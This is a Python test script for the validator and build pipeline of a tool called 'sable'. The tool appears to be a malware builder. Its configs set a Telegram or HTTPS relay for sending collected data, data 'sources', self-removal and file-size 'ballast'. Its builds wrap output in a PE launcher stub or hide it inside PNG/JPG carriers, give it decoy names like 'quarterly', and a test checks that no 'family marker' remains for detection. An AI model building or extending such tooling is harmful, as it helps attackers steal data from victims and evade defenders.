"""Validate + pipeline contract: six rules, stage ordering, real end-to-end build."""

from __future__ import annotations

import os
import sys
import tempfile
from dataclasses import replace
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import pipeline, validate
from core.schema import RelayConfig, RunConfig, SourceConfig

results: list[tuple[str, bool, str]] = []


def _pe_stub() -> bytes:
    """The smallest image `BeginUpdateResource` accepts.

    Every build stamps a per-build nonce resource into the stub, so a stub that is not a PE
    is refused before any container arithmetic runs. Duplicated from `tests/support.py`
    because a probe cannot import the test package.
    """
    import struct

    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
    optional = bytearray(0xF0)
    struct.pack_into("<H", optional, 0, 0x20B)
    struct.pack_into("<I", optional, 16, 0x1000)
    struct.pack_into("<I", optional, 20, 0x1000)
    struct.pack_into("<I", optional, 32, 0x1000)
    struct.pack_into("<I", optional, 36, 0x200)
    struct.pack_into("<I", optional, 56, 0x2000)
    struct.pack_into("<I", optional, 60, 0x200)
    struct.pack_into("<I", optional, 108, 16)
    section = struct.pack(
        "<8sIIIIIIHHI", b".text", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020
    )
    head = bytes(dos) + b"PE\x00\x00" + coff + bytes(optional) + section
    return head.ljust(0x200, b"\x00") + b"\xcc" * 0x200


def _png_stub() -> bytes:
    """A real, decodable 4x4 PNG. Duplicated from ``tests/support.py``: a probe cannot
    import the test package."""
    import struct
    import zlib

    def chunk(kind: bytes, body: bytes) -> bytes:
        return (
            len(body).to_bytes(4, "big")
            + kind
            + body
            + zlib.crc32(kind + body).to_bytes(4, "big")
        )

    raw = b"".join(b"\x00" + b"\x40\x80\xc0" * 4 for _ in range(4))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 4, 4, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(raw, 9))
        + chunk(b"IEND", b"")
    )


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, str(detail)))


MUTEX = "Global\\SABLE_VALIDATE_9f2c"
SEAL_KEY = "k-3f9a-validate-key"


def cfg(**overrides):
    base = RunConfig(
        schema_version=1,
        mutex=MUTEX,
        seal_key=SEAL_KEY,
        relay=RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        sources=SourceConfig(),
        self_remove=False,
        ballast_mb=0,
    )
    return base if not overrides else replace(base, **overrides)


def rules(problems) -> set[str]:
    return {p.rule for p in problems}


def main() -> int:
    # --- happy path -----------------------------------------------------------
    problems = validate.validate(cfg(), mode="py")
    check("clean config has no blocking", not validate.blocking(problems), len(problems))

    # --- rule 1: mutex --------------------------------------------------------
    check("empty mutex blocks", "mutex" in rules(validate.validate(cfg(mutex="   "), mode="py")))
    check(
        "long mutex blocks",
        "mutex" in rules(validate.validate(cfg(mutex="x" * 201), mode="py")),
    )
    bad = validate.validate(cfg(mutex='Global\\a<b>c'), mode="py")
    check("illegal mutex chars block", "mutex" in rules(bad), validate.describe(bad))
    note = validate.validate(cfg(mutex="\\NoNamespace"), mode="py")
    check(
        "leading backslash is a note not a block",
        not validate.blocking(note) and "mutex" in rules(note),
        validate.describe(note),
    )

    # --- rule 2: seal key -----------------------------------------------------
    check("short key blocks", "seal_key" in rules(validate.validate(cfg(seal_key="abc"), mode="py")))
    check(
        "key with trailing space blocks",
        "seal_key" in rules(validate.validate(cfg(seal_key=SEAL_KEY + " "), mode="py")),
    )
    check(
        "12-char key passes",
        not validate.blocking(validate.validate(cfg(seal_key="abcdefghijkl"), mode="py")),
    )

    # --- rule 3: endpoint, keyed on kind --------------------------------------
    cases = [
        ("https", "https://relay.example/ingest", True, "valid https"),
        ("https", "", False, "empty endpoint"),
        ("https", "ftp://relay.example", False, "wrong scheme"),
        ("https", "https://", False, "no host"),
        ("https", "https://relay.example/a b", False, "embedded space"),
        ("https", " https://relay.example", False, "leading space"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw$42", True, "valid telegram"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", False, "bare token, no chat"),
        ("telegram", "nocolon$42", False, "token has no colon"),
        ("telegram", "123456789:short$42", False, "token secret too short"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", False, "no chat"),
        ("telegram", "a$b$c", False, "two dollars"),
    ]
    for kind, endpoint, passes, label in cases:
        got = validate.validate(cfg(relay=RelayConfig(kind=kind, endpoint=endpoint)), mode="py")
        ok = not validate.blocking(got)
        check(f"endpoint {label}", ok == passes, validate.describe(got))

    unknown = validate.validate(
        cfg(relay=RelayConfig(kind="carrier-pigeon", endpoint="x")), mode="py"
    )
    paths = {p.path for p in unknown}
    check("unknown kind blocks under endpoint rule", "relay.kind" in paths, str(paths))

    # --- rule 4: at least one source ------------------------------------------
    from core.schema import SOURCE_FIELDS

    dark = SourceConfig(**{name: False for name in SOURCE_FIELDS})
    check("all sources off blocks", "sources" in rules(validate.validate(cfg(sources=dark), mode="py")))

    # --- rule 5: ballast ------------------------------------------------------
    check("negative ballast blocks", "ballast_mb" in rules(validate.validate(cfg(ballast_mb=-1), mode="py")))
    check("over-ceiling ballast blocks", "ballast_mb" in rules(validate.validate(cfg(ballast_mb=4097), mode="py")))
    check("ceiling is legal", not validate.blocking(validate.validate(cfg(ballast_mb=4096), mode="py")))
    noted = validate.validate(cfg(ballast_mb=8), mode="py")
    check(
        "ballast on script is a note",
        not validate.blocking(noted) and "ballast_mb" in rules(noted),
        validate.describe(noted),
    )

    # --- rule 6: output -------------------------------------------------------
    with tempfile.TemporaryDirectory(prefix="sable-pipe-") as scratch:
        work = Path(scratch)
        stub = work / "stub.bin"
        stub.write_bytes(_pe_stub())
        empty_stub = work / "empty.bin"
        empty_stub.write_bytes(b"")

        check(
            "exe without launcher blocks",
            "output" in rules(validate.validate(cfg(), mode="exe")),
        )
        check(
            "exe with launcher passes",
            not validate.blocking(validate.validate(cfg(), mode="exe", stub=stub)),
        )
        check(
            "empty launcher blocks",
            "output" in rules(validate.validate(cfg(), mode="exe", stub=empty_stub)),
        )
        check("unknown mode blocks", "output" in rules(validate.validate(cfg(), mode="dll")))
        check(
            "wrong name suffix blocks",
            "output" in rules(validate.validate(cfg(), mode="exe", name="x.py", stub=stub)),
        )
        check(
            "bare name is a note",
            not validate.blocking(validate.validate(cfg(), mode="py", name="report")),
        )
        check(
            "matching name passes",
            not validate.blocking(validate.validate(cfg(), mode="py", name="report.py")),
        )

        # --- carrier ---
        #
        # The check reads the file's own terminator rather than trusting its name, because a
        # build of a build is a file whose size no longer matches its image.
        carrier = work / "shot.png"
        carrier.write_bytes(_png_stub())
        carried = work / "already.png"
        carried.write_bytes(_png_stub() + b"\x00" * 64)
        exe_as_png = work / "fake.png"
        exe_as_png.write_bytes(_pe_stub())

        check(
            "an image mode without a carrier blocks",
            "output" in rules(validate.validate(cfg(), mode="png")),
        )
        check(
            "an image mode with a carrier passes",
            not validate.blocking(validate.validate(cfg(), mode="png", carrier=carrier)),
        )
        check(
            "missing carrier file blocks",
            "output" in rules(validate.validate(cfg(), mode="png", carrier=work / "nope.png")),
        )
        check(
            "a carrier with a tail blocks",
            "output" in rules(validate.validate(cfg(), mode="png", carrier=carried)),
        )
        check(
            "an executable named .png blocks",
            "output" in rules(validate.validate(cfg(), mode="png", carrier=exe_as_png)),
        )
        check(
            "a carrier on a script mode is a note",
            not validate.blocking(validate.validate(cfg(), mode="py", carrier=carrier)),
        )
        check(
            "a bare image name is a note",
            not validate.blocking(validate.validate(cfg(), mode="png", name="shot", carrier=carrier)),
        )
        check(
            "a wrong image suffix blocks",
            "output" in rules(
                validate.validate(cfg(), mode="png", name="shot.jpg", carrier=carrier)
            ),
        )

        # ``dir`` is a launcher tree, so its exe takes icon and version patches. The note
        # used to fire here too, telling the operator a setting was ignored while the build
        # applied it.
        icon = work / "a.ico"
        icon.write_bytes(bytes.fromhex("000001000100") + b"\x00" * 32)
        for mode in ("py", "png", "jpg"):
            check(
                f"icon is ignored for {mode}",
                any(
                    "has no resource table" in problem.message
                    for problem in validate.validate(cfg(), mode=mode, icon=icon, carrier=carrier)
                ),
            )
        check(
            "icon applies to dir",
            not any(
                "has no resource table" in problem.message
                for problem in validate.validate(cfg(), mode="dir", icon=icon, stub=stub)
            ),
        )

    # --- never raises ---------------------------------------------------------
    broken = cfg()
    object.__setattr__(broken, "sources", None)
    fallback = validate.validate(broken, mode="py")
    check(
        "broken config returns internal, does not raise",
        "internal" in rules(fallback),
        validate.describe(fallback),
    )
    check("describe empty is blank", validate.describe([]) == "")
    check(
        "describe caps at limit",
        validate.describe(
            [validate.Problem("r", "p", "m") for _ in range(9)], limit=5
        ).endswith("and 4 more"),
    )

    # --- pipeline: end to end, script mode ------------------------------------
    with tempfile.TemporaryDirectory(prefix="sable-run-") as scratch:
        out = Path(scratch) / "out"
        events: list[pipeline.Event] = []
        stub = Path(scratch) / "stub.bin"
        stub.write_bytes(_pe_stub())

        outcome = pipeline.run(
            cfg(),
            root=ROOT,
            out_dir=out,
            mode="py",
            progress=events.append,
        )
        check("pipeline produced an artifact", outcome.artifact.is_file(), outcome.artifact)
        check("artifact is named or generated", outcome.artifact.suffix == ".py", outcome.artifact.name)
        check("no working name left behind",
              not any(p.name.startswith("sable-build-") for p in out.iterdir()),
              str([p.name for p in out.iterdir()]))
        check("outcome size matches disk", outcome.size == outcome.artifact.stat().st_size)
        check("outcome seconds positive", outcome.seconds > 0, f"{outcome.seconds:.3f}")

        stages = [e.stage for e in events]
        check("every stage fired", set(stages) == set(pipeline.STAGES), str(sorted(set(stages))))
        check("first event is validate", stages[0] == pipeline.STAGE_VALIDATE)
        check("last event is done", stages[-1] == pipeline.STAGE_DONE)
        fractions = [e.fraction for e in events]
        check("fractions monotonic", fractions == sorted(fractions), str(fractions))
        check("fraction ends at 1.0", fractions[-1] == 1.0, fractions[-1])

        # the shipped script must actually run its own boot path shape
        text = outcome.artifact.read_text(encoding="utf-8")
        check("script carries the key", SEAL_KEY in text)
        check("script parses", bool(compile(text, str(outcome.artifact), "exec")))

        # --- pipeline: custom name -------------------------------------------------
        named = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", name="quarterly")
        check("custom bare name gets extension", named.artifact.suffix == ".py", named.artifact.name)
        check("custom name honoured", named.artifact.stem.startswith("quarterly"), named.artifact.name)

        # --- pipeline: collision does not overwrite --------------------------------
        again = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", name="quarterly")
        check("collision produced a different file", again.artifact != named.artifact,
              f"{named.artifact.name} then {again.artifact.name}")
        check("original survived", named.artifact.is_file())

        # --- pipeline: exe mode ----------------------------------------------------
        exe = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="exe", stub=stub)
        check("exe produced", exe.artifact.suffix == ".exe" and exe.artifact.is_file())
        blob = exe.artifact.read_bytes()
        offset = int.from_bytes(blob[-8:], "little")
        check("exe carries an offset footer", 0 < offset < len(blob), blob[-8:].hex())
        check("no family marker in the tail", b"SBLT" not in blob[-12:], blob[-12:].hex())

        # --- pipeline: validation failure carries every problem --------------------
        try:
            pipeline.run(cfg(mutex="", seal_key="x"), root=ROOT, out_dir=out, mode="py")
        except pipeline.ValidationFailed as exc:
            paths = {p.path for p in exc.problems}
            check("ValidationFailed carries both fields", {"mutex", "seal_key"} <= paths, str(paths))
            check("ValidationFailed names its stage", exc.stage == "validate")
        except Exception as exc:
            check("ValidationFailed carries both fields", False, f"{type(exc).__name__}: {exc}")
        else:
            check("ValidationFailed carries both fields", False, "no error raised")

        # --- pipeline: cancel stops before work ------------------------------------
        try:
            pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", cancel=lambda: True)
        except pipeline.PipelineCancelled as exc:
            check("cancel raises PipelineCancelled", exc.stage == "validate")
        except Exception as exc:
            check("cancel raises PipelineCancelled", False, type(exc).__name__)
        else:
            check("cancel raises PipelineCancelled", False, "no error raised")

        # --- pipeline: a raising progress callback does not break the build -------
        def noisy(event):
            raise RuntimeError("ui slot bug")

        survived = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", progress=noisy)
        check("raising progress callback survives", survived.artifact.is_file())

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
